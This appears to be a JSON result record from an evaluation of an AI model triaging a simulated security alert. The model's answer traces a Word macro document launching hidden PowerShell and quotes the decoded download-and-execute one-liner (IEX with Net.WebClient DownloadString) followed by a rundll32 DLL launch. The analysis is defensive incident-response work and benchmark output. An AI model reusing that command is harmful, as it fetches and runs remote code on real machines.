@@ -1,0 +1,106 @@
+{
+ "scenario_id": "T043",
+ "condition": "C3",
+ "variant": "P2",
+ "backend": "openai:gpt-6.1-sol",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:41:50 UTC, Explorer launched Word opening C:\\\\Users\\\\ivy.chen\\\\Downloads\\\\Statement.docm on WS-ICHEN-01 under NWD\\\\ivy.chen.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T043-00124\",\n        \"T043-00125\"\n      ]\n    },\n    {\n      \"claim\": \"At 13:41:52 UTC, that Word process launched PowerShell PID 4748 under ivy.chen with -nop, -w hidden and an encoded command. This directly documents PowerShell activity close to the reported time.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T043-00128\",\n        \"T043-00129\"\n      ]\n    },\n    {\n      \"claim\": \"The encoded command decodes to IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nwd-it/tools/main/u.ps1'), instructing PowerShell to retrieve and execute remote script text.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T043-00128\",\n        \"T043-00129\"\n      ]\n    },\n    {\n      \"claim\": \"The proxy recorded HTTP 200 for the exact u.ps1 URL. Its tunnel ID PT-22002d49010451fe and client source port 52805 associate the inspected GET with a connection attributed by endpoint telemetry to PowerShell PID 4748, rather than relying on the separate browser-like user-agent connection.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T043-00130\",\n        \"T043-00132\",\n        \"T043-00136\",\n        \"T043-00138\"\n      ]\n    },\n    {\n      \"claim\": \"At 13:41:55 UTC, PowerShell PID 4748 spawned rundll32.exe with the command C:\\\\Users\\\\ivy.chen\\\\AppData\\\\Roaming\\\\svchelper.dll,Init. This establishes a subsequent DLL execution attempt, though not successful DLL initialization.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T043-00139\",\n        \"T043-00140\"\n      ]\n    },\n    {\n      \"claim\": \"The document-to-hidden-encoded-PowerShell chain, correlated remote-script retrieval and subsequent rundll32 invocation support a malicious-activity finding for the alerted activity. This is not the documented IT patching pattern: the observed parent is Word and the command retrieves an Internet script, rather than running the inventory-described Apply-Updates.ps1.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\n        \"T043-00124\",\n        \"T043-00128\",\n        \"T043-00132\",\n        \"T043-00138\",\n        \"T043-00139\"\n      ]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The supplied collection-status metadata reports missing winsec and sysmon collection on WS-NBLAKE-01 from 13:30 to 14:10 UTC. It reports those sensors healthy on WS-ICHEN-01; the help-desk-host outage does not negate the directly observed alerted process chain.\",\n    \"The inspected proxy GET records the requested URL and HTTP status but does not provide the response body, so the retrieved script's contents cannot be established from T043-00132.\",\n    \"The rundll32 process creation records show the requested DLL invocation, not a DLL image-load result or evidence that its Init export completed successfully (T043-00139, T043-00140).\"\n  ],\n  \"claims_not_established\": [\n    \"The document's delivery source, its contents and whether a macro specifically caused the Word child process are not established by the document-open and process-creation records (T043-00124, T043-00128).\",\n    \"Ownership or authorization of the nwd-it repository is not established by its name or the successful GET (T043-00132).\",\n    \"Successful DLL initialization, persistence, command-and-control, exfiltration, privilege escalation and a specific malware family are not established by the observed retrieval and rundll32 invocation (T043-00132, T043-00139, T043-00140).\",\n    \"The observed PowerShell process began at 13:41:52 UTC and ended at 13:42:18 UTC; the records do not prove that this was the exact window the user saw around 13:40 UTC (T043-00128, T043-00145).\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Preserve and analyze Statement.docm, including VBA content, hashes, origin metadata and delivery artifacts, to investigate the Word-to-PowerShell launch (T043-00124, T043-00128).\",\n    \"Recover the historical u.ps1 response body from proxy retention or endpoint artifacts; collect available PowerShell script-block, module and operational logs for PID 4748 (T043-00128, T043-00132).\",\n    \"Acquire svchelper.dll and relevant file-creation, image-load, memory and endpoint-detection evidence to determine its provenance and execution outcome (T043-00139, T043-00140).\",\n    \"Isolate WS-ICHEN-01 while preserving evidence, and scope for the document, exact script URL and DLL path across the environment based on the alerted execution chain (T043-00124, T043-00128, T043-00132, T043-00139).\"\n  ],\n  \"unrelated_findings\": [\n    \"Separate ticket: at 13:32 UTC, sam.okafor Kerberos ticket activity originated from WS-ICHEN-01, followed by a successful network logon to WS-SOKAFOR-01 from WS-ICHEN-01. This direction differs from the supplied remote-administration practice. The records do not establish credential theft or a connection to the later document/PowerShell chain, and this finding does not decide the alert (T043-00080, T043-00082, T043-00084).\",\n    \"Separate software-authorization review: ZoomUpdate.exe --check ran as SYSTEM on WS-ICHEN-01 at 14:03 UTC. Zoom is not among the supplied approved services; the process records alone do not establish malicious behavior or a link to the alerted PowerShell activity (T043-00203, T043-00204).\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 41791,
+    "output": 1522
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "At 13:41:50 UTC, Explorer launched Word opening C:\\Users\\ivy.chen\\Downloads\\Statement.docm on WS-ICHEN-01 under NWD\\ivy.chen.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T043-00124",
+     "T043-00125"
+    ]
+   },
+   {
+    "claim": "At 13:41:52 UTC, that Word process launched PowerShell PID 4748 under ivy.chen with -nop, -w hidden and an encoded command. This directly documents PowerShell activity close to the reported time.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T043-00128",
+     "T043-00129"
+    ]
+   },
+   {
+    "claim": "The encoded command decodes to IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nwd-it/tools/main/u.ps1'), instructing PowerShell to retrieve and execute remote script text.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T043-00128",
+     "T043-00129"
+    ]
+   },
+   {
+    "claim": "The proxy recorded HTTP 200 for the exact u.ps1 URL. Its tunnel ID PT-22002d49010451fe and client source port 52805 associate the inspected GET with a connection attributed by endpoint telemetry to PowerShell PID 4748, rather than relying on the separate browser-like user-agent connection.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T043-00130",
+     "T043-00132",
+     "T043-00136",
+     "T043-00138"
+    ]
+   },
+   {
+    "claim": "At 13:41:55 UTC, PowerShell PID 4748 spawned rundll32.exe with the command C:\\Users\\ivy.chen\\AppData\\Roaming\\svchelper.dll,Init. This establishes a subsequent DLL execution attempt, though not successful DLL initialization.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T043-00139",
+     "T043-00140"
+    ]
+   },
+   {
+    "claim": "The document-to-hidden-encoded-PowerShell chain, correlated remote-script retrieval and subsequent rundll32 invocation support a malicious-activity finding for the alerted activity. This is not the documented IT patching pattern: the observed parent is Word and the command retrieves an Internet script, rather than running the inventory-described Apply-Updates.ps1.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T043-00124",
+     "T043-00128",
+     "T043-00132",
+     "T043-00138",
+     "T043-00139"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The supplied collection-status metadata reports missing winsec and sysmon collection on WS-NBLAKE-01 from 13:30 to 14:10 UTC. It reports those sensors healthy on WS-ICHEN-01; the help-desk-host outage does not negate the directly observed alerted process chain.",
+   "The inspected proxy GET records the requested URL and HTTP status but does not provide the response body, so the retrieved script's contents cannot be established from T043-00132.",
+   "The rundll32 process creation records show the requested DLL invocation, not a DLL image-load result or evidence that its Init export completed successfully (T043-00139, T043-00140)."
+  ],
+  "claims_not_established": [
+   "The document's delivery source, its contents and whether a macro specifically caused the Word child process are not established by the document-open and process-creation records (T043-00124, T043-00128).",
+   "Ownership or authorization of the nwd-it repository is not established by its name or the successful GET (T043-00132).",
+   "Successful DLL initialization, persistence, command-and-control, exfiltration, privilege escalation and a specific malware family are not established by the observed retrieval and rundll32 invocation (T043-00132, T043-00139, T043-00140).",
+   "The observed PowerShell process began at 13:41:52 UTC and ended at 13:42:18 UTC; the records do not prove that this was the exact window the user saw around 13:40 UTC (T043-00128, T043-00145)."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Preserve and analyze Statement.docm, including VBA content, hashes, origin metadata and delivery artifacts, to investigate the Word-to-PowerShell launch (T043-00124, T043-00128).",
+   "Recover the historical u.ps1 response body from proxy retention or endpoint artifacts; collect available PowerShell script-block, module and operational logs for PID 4748 (T043-00128, T043-00132).",
+   "Acquire svchelper.dll and relevant file-creation, image-load, memory and endpoint-detection evidence to determine its provenance and execution outcome (T043-00139, T043-00140).",
+   "Isolate WS-ICHEN-01 while preserving evidence, and scope for the document, exact script URL and DLL path across the environment based on the alerted execution chain (T043-00124, T043-00128, T043-00132, T043-00139)."
+  ],
+  "unrelated_findings": [
+   "Separate ticket: at 13:32 UTC, sam.okafor Kerberos ticket activity originated from WS-ICHEN-01, followed by a successful network logon to WS-SOKAFOR-01 from WS-ICHEN-01. This direction differs from the supplied remote-administration practice. The records do not establish credential theft or a connection to the later document/PowerShell chain, and this finding does not decide the alert (T043-00080, T043-00082, T043-00084).",
+   "Separate software-authorization review: ZoomUpdate.exe --check ran as SYSTEM on WS-ICHEN-01 at 14:03 UTC. Zoom is not among the supplied approved services; the process records alone do not establish malicious behavior or a link to the alerted PowerShell activity (T043-00203, T043-00204)."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 17,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 22.2
+}
